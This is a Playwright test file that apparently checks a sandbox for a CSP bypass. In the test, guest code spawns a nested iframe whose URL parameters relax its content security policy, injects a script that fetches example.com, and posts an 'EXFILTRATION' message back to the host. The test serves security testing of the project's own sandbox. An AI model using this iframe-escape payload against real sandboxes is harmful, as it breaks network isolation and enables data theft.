import { test, expect } from '@playwright/test';

test('CSP Bypass via Nested Iframe - Data Exfiltration', async ({ page }) => {
  // 1. Setup: Host Page
  await page.goto('http://localhost:3333/playground/security.html');
  await page.waitForFunction(() => window.SandboxControl !== undefined);

  // 2. Setup: Enable execution (Simulating a useful sandbox with scripts enabled)
  // Without this, the sandbox effectively blocks all code execution, rendering "breakout" impossible
  // unless we find a declarative bypass (none found yet).
  await page.evaluate(() => {
     window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true');
  });
  await page.waitForTimeout(2000); // Allow reload

  // 3. The Payload
  // We construct a payload that:
  // a) Creates a child iframe with a relaxed CSP (allowing 'example.com').
  // b) Fetches data from 'example.com' inside that child.
  // c) Sends the data back to the host via postMessage.
  // d) The host logs it, proving we broke the network boundary and exfiltrated data.

  const payload = `
    (async () => {
      // Step A: Spawn Malicious Frame
      const iframe = document.createElement('iframe');
      // We ask for 'example.com' access. The server grants it because we control the params.
      iframe.src = "/inner-frame.html?allow=example.com&unsafe";
      document.body.appendChild(iframe);

      await new Promise(r => iframe.onload = r);

      // Step B: Execute in Malicious Frame
      const child = iframe.contentWindow;
      const script = child.document.createElement('script');
      script.textContent = \`
          fetch('http://example.com', { mode: 'no-cors' })
             .then(r => {
                 // Step C: Exfiltrate
                 // We successfully connected to a disallowed domain!
                 window.top.postMessage({
                    type: 'EXFILTRATION',
                    data: 'Successfully reached example.com'
                 }, '*');
             })
             .catch(e => window.top.postMessage({ type: 'ERROR', data: e.message }, '*'));
      \`;
      child.document.body.appendChild(script);
    })();
  `;

  // 4. Trigger the exploit using ONLY the exposed 'execute' method
  console.log("Triggering exploit...");
  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, payload);

  // 5. Verify: The Host receives the exfiltrated confirmation
  // This proves the Guest code executed and reached out to the world.
  const msg = await page.waitForEvent('console', msg => msg.text().includes('Successfully reached example.com') || msg.text().includes('EXFILTRATION'));

  // Note: The host logs messages it receives. We can also listen for the raw message event if needed.
  // But checking the logs is enough "Proof of Life".

  // Actually, let's look for the message in the DOM logs if the console event is flaky
  const success = await page.evaluate(() => {
     return new Promise(resolve => {
        window.addEventListener('message', m => {
            if (m.data.type === 'EXFILTRATION') resolve(m.data.data);
        });
     });
  });

  expect(success).toBe('Successfully reached example.com');
});
